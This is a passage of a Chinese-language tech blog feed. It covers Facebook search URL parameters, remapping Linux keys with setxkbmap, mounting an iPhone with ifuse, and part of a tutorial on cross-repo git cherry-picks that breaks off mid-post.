&lt;h3&gt;和發文有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-by/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-publishers/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-tagged/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-media-tagged/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-topic/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-news/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-recent/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/reshare-stories-by/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/reviews-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/hashtag/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和照片有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/photos-by/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-uploaded/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-of/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-tagged/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-keyword/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-interested/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-interacted/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-recommended-for/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/recent-photos/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和按讚有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-liked/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和留言有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-commented/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;和打卡、地點、評論有關的&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/recent-places-visited/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-visited/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-checked-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/visitors/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-named/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-near/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/places-reviewed/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/pages-in/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/stories-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/reviews-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/events-at/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/events-near/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/residents/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/home-residents/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/users-birth-place/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;善用這些搜尋網址可能可以在 Facebook 上做更有效的搜尋，有些是透過預設的搜尋介面比較難選取到的部份，參考的這篇文章：&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt; 裡頭還有提到一些更進階的小技巧，可以結合兩個參數做搜尋，例如搜尋某間公司擁有某個名字的 Facebook 使用者、搜尋住處在某個地方擁有某個姓名的使用者、……等等，像下面這些參數就是可以用來做更進階一些搜尋用的參數：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;和時間有關的  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/yesterday/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/today/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/this-week/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/last-week/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/recent/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/this-month/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/last-month/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/this-year/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/last-year/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/YEAR/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/before/ /after/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和關鍵字有關的  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/stories-keyword/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/photos-keyword/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;和名字有關的  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;/users-named/&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;/pages-named/&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這部份必須要在網址最後加上 &lt;code&gt;/intersect/&lt;/code&gt;，表示取這幾個選項的交集做搜尋，格式也有稍稍的不太一樣，這邊就不做詳細的介紹，有興趣的人可以再點下面參考文章的第一篇進去察看，裏面有滿多實際例子的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://netbootcamp.org/facebookpeoplesearchtips/"&gt;Facebook People Search Tips | OSINT Training by Bob Brasich&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://findmyfbid.in/"&gt;Find Facebook ID in two simple steps | Find Facebook ID&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Facebook"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Linux 上如何透過指令更改鍵盤鍵位</title><link href="https://blog.m157q.tw/posts/2018/01/01/change-keymap-on-linux/" rel="alternate"></link><published>2018-01-02T22:17:41+08:00</published><updated>2018-01-02T22:17:41+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-01:posts/2018/01/01/change-keymap-on-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;setxkbmap -option ctrl:swapcaps -option altwin:swap_alt_win&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/dotfiles/blob/master/swap_win_keyboard_layout.sh"&gt;dotfiles/swap_win_keyboard_layout.sh at master · M157q/dotfiles · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setxkbmap -option ctrl:swapcaps&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/M157q/dotfiles/blob/master/swap_mac_keyboard_layout.sh"&gt;dotfiles/swap_mac_keyboard_layout.sh at master · M157q/dotfiles · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;這邊提到的都會是在 X Window 環境下的設定方式為主，這是我目前正在使用也確定可行的方法。非 X Window 的環境下則是放在補充，但因為這部份我沒有親自試過，所以僅供參考。  &lt;/p&gt;
&lt;p&gt;之前都是用 &lt;code&gt;xmodmap&lt;/code&gt; 這個指令，搭配一份已經預先寫好的設定檔：&lt;a href="https://github.com/M157q/dotfiles/blob/master/Xmodmap"&gt;dotfiles/Xmodmap at master · M157q/dotfiles · GitHub&lt;/a&gt;，讓 &lt;code&gt;xmodmap&lt;/code&gt; 去執行這份設定檔，它會依照設定檔把鍵位更換掉。但因為我有時候是使用 Mac Book Air 的 Mac 鍵盤，有時候是外接 Filco 的鍵盤，差別最大的地方在於左下角。Mac 的鍵盤會多了一顆 Command 鍵，然後在桌面環境下，無論是我之前使用的 AwesomeWM 或是現在使用的 i3wm，在使用 Mac 鍵盤的時候會以 Command 鍵來當作 Mod4 鍵，但在非 Mac 鍵盤上，則會以 Win 鍵來當作 Mod4 鍵。  &lt;/p&gt;
&lt;p&gt;問題就在於我已經習慣 Mac 鍵盤上的設定，覺得 Mod4 鍵在空白鍵的左邊比較順手，如果使用非 Mac 鍵盤的話，Mod4 鍵則會在空白鍵左邊的左邊，按起來比較抝手。所以針對不同的鍵盤我得有不同鍵位的改變設定，讓我的操作習慣一致。  &lt;/p&gt;
&lt;p&gt;之前就覺得 &lt;code&gt;xmodmap&lt;/code&gt; 的設定檔有點冗長，我只是要單純切換 CapsLock 和左邊的 Ctrl 鍵就要 6 行，等於是我要寫另外一份設定檔，加上我去看了設定檔的文件，覺得挺麻煩的，我也常常搞混。於是就花了點時間找尋看看有沒有比較方便的方式，後來找到 &lt;code&gt;setxkbmap&lt;/code&gt; 這個指令，可以直接一行指令解決，利用這篇文章紀錄一下。  &lt;/p&gt;
&lt;p&gt;不管是 Mac 鍵盤上的 Command 鍵，或是非 Mac 鍵盤上的 Win 鍵，在 X Window 的鍵位判定上都會被當作是 "Super" 鍵，即這兩個會被當成是一樣作用的按鈕，但是他們在鍵盤上排列的位置卻不相同：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mac 鍵盤，Command 鍵都是在空白鍵隔壁。  &lt;/li&gt;
&lt;li&gt;非 Mac 鍵盤，Win 鍵都是在空白鍵隔壁的隔壁，中間隔著一個 Alt 鍵。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是只要我使用非 Mac 鍵盤的話，我就會需要把 Super 鍵和 Alt 鍵對調。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;首先當然是得安裝 &lt;code&gt;setxkbmap&lt;/code&gt; 這個程式，如果是使用 Arch Linux 的話，可以用以下指令安裝：&lt;br /&gt;
&lt;code&gt;sudo pacman -S xorg-setxkbmap&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝好了之後，使用方式也很簡單，就只要一行指令就行，然後每一個設定就使用 &lt;code&gt;-option&lt;/code&gt; 參數來設定，有三個設定就會有三個 &lt;code&gt;-option&lt;/code&gt;。切換的規則可以在 &lt;code&gt;/usr/share/X11/xkb/rules/base&lt;/code&gt; 找到，我覺得名稱還算好懂，但裏面其實有滿多規則的，這篇文章裏面不會一一介紹，只會講到我有用到的。  &lt;/p&gt;
&lt;p&gt;舉例來說，如果我要單純把 Ctrl 和 CapsLock 對調的話，就使用以下指令：&lt;br /&gt;
&lt;code&gt;setxkbmap -option ctrl:swapcaps&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;如果要把 Ctrl 和 CapsLock 對調還要把 Alt 和 Win 鍵對調的話，就使用以下指令：&lt;br /&gt;
&lt;code&gt;setxkbmap -option ctrl:swapcaps -option altwin:swap_alt_win&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;可以透過 &lt;code&gt;-device&lt;/code&gt; 這個參數來做到只針對特定的鍵盤來更改鍵位，不會同時更 MacBook Air 本身的鍵盤和 USB 外接鍵盤。至於這個參數要接的 device id 則可以透過 &lt;code&gt;xinput&lt;/code&gt; 這個指令來察看。而原先使用的 &lt;code&gt;xmodmap&lt;/code&gt; 則貌似無法針對個別鍵盤來做設定。  &lt;/p&gt;
&lt;p&gt;但每次要從已經更改後的鍵位，換到另外一個更改鍵位的時候，不能直接使用指令切換，而是得先用 &lt;code&gt;setxkbmap -option&lt;/code&gt; 來重置鍵位，然後才能再下另外一個指令來切換到另外一種鍵位，因為 &lt;code&gt;setxkbmap&lt;/code&gt; 預設是會繼續新增 &lt;code&gt;-option&lt;/code&gt; 到目前的設定，這也是為什麼我上面自己整理的兩個 script 的第一行都要先用 &lt;code&gt;setxkbmap -option&lt;/code&gt; 的原因。如果不這樣做的話，可能會出現很奇怪的狀況，這點是要注意的。在 &lt;code&gt;man setxkbmap&lt;/code&gt; 裡頭關於 &lt;code&gt;-option&lt;/code&gt; 的說明部份也有提到這點：  &lt;/p&gt;
&lt;p&gt;&lt;img alt="setxkbmap-option" src="/files/change-keymap-on-linux/setxkbmap-option.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;補充：xkbcomp&lt;/h2&gt;
&lt;p&gt;其實在 X Window 底下，除了使用 &lt;code&gt;xmodmap&lt;/code&gt; 和 &lt;code&gt;setxkbmap&lt;/code&gt; 兩個指令以外，還有一個 &lt;code&gt;xkbcomp&lt;/code&gt; 指令可以使用，但因為我覺得這個指令還是沒有 &lt;code&gt;setxkbmap&lt;/code&gt; 來得方便，所以後來沒有採用。&lt;code&gt;xkbcomp&lt;/code&gt; 一樣可以透過 &lt;code&gt;-i&lt;/code&gt; 來針對個別鍵盤做設定，而 device id 也是一樣透過 &lt;code&gt;xinput&lt;/code&gt; 這個指令來察看。  &lt;/p&gt;
&lt;p&gt;有關於 &lt;code&gt;xkbcomp&lt;/code&gt; 的設定：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;簡單的範例可以參考這篇文章：&lt;a href="https://lampjs.wordpress.com/2015/06/26/remapchange-your-secondaryusb-keyboard-keys/"&gt;Remap/change your secondary/usb keyboard keys – Linux, Apache, MySQL, PHP, Javascript&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;詳細一點的可以參考 ArchWiki：&lt;a href="https://wiki.archlinux.org/index.php/X_KeyBoard_extension#Multiple_keyboards"&gt;X KeyBoard extension - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;補充：在無 X Window 的 virtual console 環境下切換鍵位&lt;/h2&gt;
&lt;p&gt;其實也有找到方法，在這篇文章有提到：&lt;a href="https://www.emacswiki.org/emacs/MovingTheCtrlKey#toc7"&gt;EmacsWiki: Moving The Ctrl Key&lt;/a&gt;，可以使用 &lt;code&gt;dumpkeys&lt;/code&gt; 和 &lt;code&gt;loadkeys&lt;/code&gt; 這兩個指令來辦到，但目前沒有強烈需求，如果哪天真的有在非 X Window 的環境下做到這件事不可的動機的話，應該就會花點時間來設定，看起來其實也是以下這樣的步驟，只是是在非 X Window 的環境下使用：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;用 &lt;code&gt;dumpkeys&lt;/code&gt; 匯出鍵位設定檔  &lt;/li&gt;
&lt;li&gt;修改設定檔  &lt;/li&gt;
&lt;li&gt;再用 &lt;code&gt;loadkeys&lt;/code&gt; 匯入鍵位設定檔  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://superuser.com/questions/760602/how-to-remap-keys-under-linux-for-a-specific-keyboard-only"&gt;How to remap keys under Linux for a specific keyboard only - Super User&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.reddit.com/r/linux/comments/1kyikn/a_one_line_command_to_remap_the_capslock_key_to/"&gt;A one line command to remap the CapsLock key to Ctrl : linux&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://askubuntu.com/questions/33774/how-do-i-remap-the-caps-lock-and-ctrl-keys"&gt;keyboard - How do I remap the Caps Lock and Ctrl keys? - Ask Ubuntu&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.noah.org/wiki/CapsLock_Remap_Howto"&gt;CapsLock Remap Howto - Noah.org&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇也算是篇滿完整的文章，重點是它是個人用 Wiki 的頁面，覺得很厲害。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lampjs.wordpress.com/2015/06/26/remapchange-your-secondaryusb-keyboard-keys/"&gt;Remap/change your secondary/usb keyboard keys – Linux, Apache, MySQL, PHP, Javascript&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/X_KeyBoard_extension#Multiple_keyboards"&gt;X KeyBoard extension - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.emacswiki.org/emacs/MovingTheCtrlKey#toc7"&gt;EmacsWiki: Moving The Ctrl Key&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Keymap"></category><category term="xmodmap"></category><category term="setxkbmap"></category><category term="X Window"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Linux 上如何拿到 iPhone 裡的資料</title><link href="https://blog.m157q.tw/posts/2017/12/31/mount-iphone-on-linux/" rel="alternate"></link><published>2017-12-31T19:01:07+08:00</published><updated>2017-12-31T19:01:07+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-31:posts/2017/12/31/mount-iphone-on-linux/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;今年 4 月換新手機，因為不愛大尺寸的手機，五吋以下的手機只剩 iPhone SE 和 Sony Xperia X Compact。但查了一下以後發現 Sony Xperia XC 似乎有過熱的問題，加上剛好當時在公司的時候有位同事幾週前才買 iPhone SE，跟他借來操作一下覺得還不錯，上網查了一些評價也都沒啥問題，而且又是秉持當初 Steve Jobs 的 iPhone 設計造型，於是就買了。  &lt;/p&gt;
&lt;p&gt;因為之前都是用 Android 手機，所以對 iPhone 的生態系不太熟，花了一點時間熟悉，其中一個就是現在紀錄的這篇。以前 Android 手機用 USB 線接到電腦後，基本上只要用 &lt;code&gt;adb&lt;/code&gt; 就可以搞定一切了，但 iPhone 這邊我花了點時間熟悉一下，還好有 ArchWiki 上有一篇專門在講 iOS 的條目：&lt;a href="https://wiki.archlinux.org/index.php/IOS"&gt;iOS - ArchWiki&lt;/a&gt;，省事了不少。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;方法&lt;/h2&gt;
&lt;p&gt;首先要安裝 &lt;code&gt;ifuse&lt;/code&gt;，如果是 Arch Linux 的使用者，可以直接用以下指令來安裝：  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo pacman -S ifuse&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝好之後使用也很簡單，只要按照以下的步驟：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;將你的 iPhone 接上電腦的 USB 埠  &lt;/li&gt;
&lt;li&gt;接上之後可以透過 &lt;code&gt;lsusb&lt;/code&gt; 或 &lt;code&gt;dmesg&lt;/code&gt; 來做確認  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;ifuse ${PATH_FOR_IPHONE_DATA}&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;透過這個指令就可以 mount iPhone 的資料了  &lt;/li&gt;
&lt;li&gt;以我來說的話，我是特別開了一個 &lt;code&gt;/media/iPhone-SE&lt;/code&gt; 的資料夾來使用，所以指令會是 &lt;code&gt;ifuse /media/iPhone-SE&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;記得資料夾的權限要設定好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;umount ${PATH_FOR_IPHONE_DATA}&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;使用完了以後要 unmount 也很簡單，就直接透過上面這個指令就行了  &lt;/li&gt;
&lt;li&gt;如果出現 Permission Denied 的話就加上 &lt;code&gt;sudo&lt;/code&gt; 吧  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;參考資料&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/IOS"&gt;iOS - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="iPhone"></category><category term="ifuse"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>使用 Git 時如何做出跨 repo 的 cherry-pick</title><link href="https://blog.m157q.tw/posts/2017/12/30/git-cross-repo-cherry-pick/" rel="alternate"></link><published>2017-12-31T01:52:05+08:00</published><updated>2017-12-31T01:52:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-12-30:posts/2017/12/30/git-cross-repo-cherry-pick/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;會有這個需求是因為在前公司的時候，有個舊的 repo 執行的服務被因為裡頭的程式碼有太多舊的東西，但仍然有目前要用的部份，所以複製到了一個新的 repo。同時舊的這邊的改動又有需要更新到新的 repo，所以必須做到跨 repo 的 cherry-pick。查了一下，StackOverflow 上也有不少人問，打聽了一下身邊工程師的朋友們，也有人有過同樣的需求。這篇把我知道的 3 個方法整理起來，並列出哪個比較好及為什麼比較好的原因。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git format-patch -k --stdout ${commit_hash_1}..${commmit_hash_2} | git am -3 -k&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;"git remote add + git fetch + git cherry-pick"&lt;/h3&gt;
&lt;p&gt;這個應該是最好懂的，只要有在 GitHub 上 fork 過別人的 repo，並按照 GitHub 的官方教學把對方的 repo 用 &lt;code&gt;git remote add&lt;/code&gt; 設定成 upstream 的人，對這套流程應該不陌生，大概就是以下的步驟：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git remote add&lt;/code&gt; 有你想要 &lt;code&gt;cherry-pick&lt;/code&gt; 的 commit 的 repo  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;git fetch&lt;/code&gt; 剛剛設定好的 remote  &lt;/li&gt;
&lt;li&gt;fetch 下來後就可以 &lt;code&gt;git checkout&lt;/code&gt; 到你要的 branch，然後用 &lt;code&gt;git log&lt;/code&gt; 找尋你要的 commit，紀錄下來後就可以進行 &lt;code&gt;cherry-pick&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;如果這樣還是不太懂的話，底下有人回覆了這篇文章：&lt;a href="https://coderwall.com/p/sgpksw/git-cherry-pick-from-another-repository"&gt;Git cherry-pick from another repository (Example)&lt;/a&gt;，把完整的步驟與指令都清楚的列出來了。  &lt;/p&gt;
&lt;p&gt;這個方式很好懂，但很麻煩，因為步驟真的有點多。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;"git diff + git apply"&lt;/h3&gt;
&lt;p&gt;比較進階一點的 Git user 會用這個方法，觀念上沒有很難懂，只是要瞭解 &lt;code&gt;git diff&lt;/code&gt; 和 &lt;code&gt;git apply&lt;/code&gt; 這兩個指令在幹嘛。其實從字面上看來大概就可以猜測到，&lt;code&gt;git diff&lt;/code&gt; 生出一個 diff 檔，而 &lt;code&gt;git apply&lt;/code&gt; 把這個 diff 檔 apply 到某個 branch 上。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;git diff&lt;/code&gt; 應該對大部分的 git user 來說不陌生，主要都是在修改檔案後要 &lt;code&gt;git add&lt;/code&gt; 之前，用 &lt;code&gt;git diff ${FILE_PATH}&lt;/code&gt; 來確認某個檔案修改的部份。但 &lt;code&gt;git diff&lt;/code&gt; 也可以用來看從 A commit 到 B commit 之間修改了哪些東西，用法也不難，&lt;code&gt;git diff ${A_COMMIT_HASH} ${B_COMMIT_HASH}&lt;/code&gt; 就行了。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;git apply&lt;/code&gt; 可能是一般 Git user 比較少用到的，但也沒有很難懂。&lt;code&gt;man git-apply&lt;/code&gt; 顯示的簡介是 &lt;strong&gt;git-apply - Apply a patch to files and/or to the index&lt;/strong&gt;，簡單來說就把一個 patch 檔 apply 到你現在的 branch。  &lt;/p&gt;
&lt;p&gt;知道了這兩個指令在幹嘛以後，我們就可以透過以下步驟來達到我們想要的效果：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git diff ${A_COMMIT_HASH} ${B_COMMIT_HASH} &amp;gt; xxx.patch&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在我們要抓 commmits 的 repo 下這行指令得到 patch 檔，以我的例子來說就是舊 repo。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;git apply xxx.patch&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在我們要加入這些 commits 的 repo 使用這行指令把 commits 新增進來，以我的例子來說就是新 repo。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;要記住 xxx.patch 的路徑要是對的，因為上個指令產生的 xxx.patch 應該是不會在新 repo 的目錄底下才對 XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果在 &lt;code&gt;git apply&lt;/code&gt; 的過程中遇到 trailing whitespace error 的話，可以參考這篇文章：&lt;a href="https://stackoverflow.com/questions/14509950/my-diff-contains-trailing-whitespace-how-to-get-rid-of-it"&gt;git - My diff contains trailing whitespace - how to get rid of it? - Stack Overflow&lt;/a&gt;，透過加入 &lt;code&gt;--whitespace=warn&lt;/code&gt; 或 &lt;code&gt;--whitespace=nowarn&lt;/code&gt; 參數來解決。  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;這樣是不是比上面那個步驟少多了？但這個方法有個缺點，就是使用 &lt;code&gt;git apply&lt;/code&gt; 的話，committer 會是使用 &lt;code&gt;git apply&lt;/code&gt; 的人，而不是原本的 committer，所以要介紹下面這個方法。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;"git format-patch + git am"&lt;/h3&gt;
&lt;p&gt;這個是 3 個方法裏面最推薦的，最後會講一下 GitHub 有一個小方法可以直接拿到 patch，可以直接給 &lt;code&gt;git am&lt;/code&gt; 使用。  &lt;/p&gt;
&lt;p&gt;基本上這方法應該是最正統的如何把別人的 commit 拿來給自己用的方式了，GitHub 也只是把這個包裝起來而已。如果是已經習慣透過 email 或者論壇收發 patch 的 Open Source contributer 兼 git 使用者，應該對這個方法習以為常。  &lt;/p&gt;
&lt;p&gt;一般的 GitHub user 應該都對這兩個指令不熟，因為 GitHub 已經把這塊都處理好了，所以使用者基本上不太需要自己操作。&lt;code&gt;man git-format-patch&lt;/code&gt; 和 &lt;code&gt;man git-am&lt;/code&gt; 就可以看到，這兩個指令基本上都是設計成在 email 的環境下使用：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;man git-format-patch&lt;/code&gt;: &lt;strong&gt;git-format-patch - Prepare patches for e-mail submission&lt;/strong&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;man git-am&lt;/code&gt;: &lt;strong&gt;git-am - Apply a series of patches from a mailbox&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有興趣的人可以自己去看個詳細，這邊就不多談，直接講使用方法：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;git format-patch -k --stdout ${A_COMMIT_HASH}..${B_COMMIT_HASH} &amp;gt; xxx.patch&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;在我們要抓 commmits 的 repo 下這行指令，以我的例子來說就是舊 repo。  &lt;/li&gt;
&lt;li&gt;A commit 要比 B commit 早，不然 output 會是空的。  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
